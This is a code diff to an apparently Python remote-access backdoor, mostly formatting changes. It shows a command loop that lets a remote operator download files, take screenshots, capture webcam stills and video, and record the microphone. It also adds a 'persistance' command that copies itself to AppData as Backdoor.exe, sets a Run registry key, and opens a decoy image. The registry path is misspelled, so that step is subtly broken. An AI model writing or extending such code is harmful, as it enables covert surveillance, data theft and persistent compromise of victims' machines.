@@ -99,34 +99,37 @@ def screenshot():
     with mss.mss() as screenshot:
         screenshot.shot(output=output_filename)
 
+
 def cam_snap():
-    c=cv2.VideoCapture(0) # zero to use the first camera available
-    check, img =c.read()  # tells us if we really got the image
+    c = cv2.VideoCapture(0)  # zero to use the first camera available
+    check, img = c.read()  # tells us if we really got the image
     cv2.imwrite("cam.png", img)
     del(c)
 
+
 def cam_video(duration):
-    video=cv2.VideoCapture(0)
+    video = cv2.VideoCapture(0)
     t0 = time.time()
     fourcc = cv2.VideoWriter_fourcc(*'xvid')
-    out = cv2.VideoWriter('vid.mp4', fourcc, 20.0, (640,480))
-    while True: 
-        check, frame=video.read()
-        if (check==True):
+    out = cv2.VideoWriter('vid.mp4', fourcc, 20.0, (640, 480))
+    while True:
+        check, frame = video.read()
+        if (check == True):
             out.write(frame)
         else:
             break
-        t1 = time.time() # current time
+        t1 = time.time()  # current time
         num_seconds = t1 - t0
         if num_seconds > duration:  # break after 5 seconds
             break
     video.release()
     cv2.destroyAllWindows()
 
+
 def mic_record(duration):
-    fps=44100
+    fps = 44100
     print('Recording...')
-    recording=sounddevice.rec(int(duration*fps), samplerate=fps, channels=2)
+    recording = sounddevice.rec(int(duration*fps), samplerate=fps, channels=2)
     sounddevice.wait()
     print("Done.")
     write("mic.wav", fps, recording)
@@ -163,15 +166,15 @@ def shell():
             except:
                 reliable_send("[!!] Failed to change directory")
                 continue
-        
+
         elif command[:3] == "pwd":
             try:
                 wd = os.getcwd()
                 reliable_send(wd)
-            except :
+            except:
                 reliable_send("[!!] Failed to print working directory")
                 pass
-            
+
         elif command[:8] == "download":
             with open(command[9:], "rb") as file:
                 send_file(file.read())
@@ -198,7 +201,7 @@ def shell():
                 os.remove("screenshot.png")
             except:
                 reliable_send("[!!] Failed to take screenshot")
-        
+
         elif command[:8] == "cam_snap":
             try:
                 cam_snap()
@@ -220,7 +223,7 @@ def shell():
                 os.remove("vid.mp4")
             except:
                 reliable_send("[!!] Failed to take a video capture")
-        
+
         elif command[:3] == "mic":
             try:
                 mic_record(int(command[4:]))
@@ -251,6 +254,20 @@ def shell():
                 reliable_send(admin)
             except:
                 reliable_send("Failed to check")
+
+        elif command[:11] == "persistance":
+            location = os.environ["appdata"] + "\\Backdoor.exe"
+            if not os.path.exists(location):
+                shutil.copyfile(sys.executable, location)
+                subprocess.call(
+                    'reg add HKCU\Software\Microsoft\Windows\CurrentVirsion\Run /v Backdoor /t REG_SZ /d "' + location + '"', shell=True)
+                name = sys._MEIPASS + "\hinata.jpg"
+                try:
+                    subprocess.Popen(name, shell=True)
+                except:
+                    num = 3
+                    nb = 1
+                    addition = num+nb
 
         else:
             try:
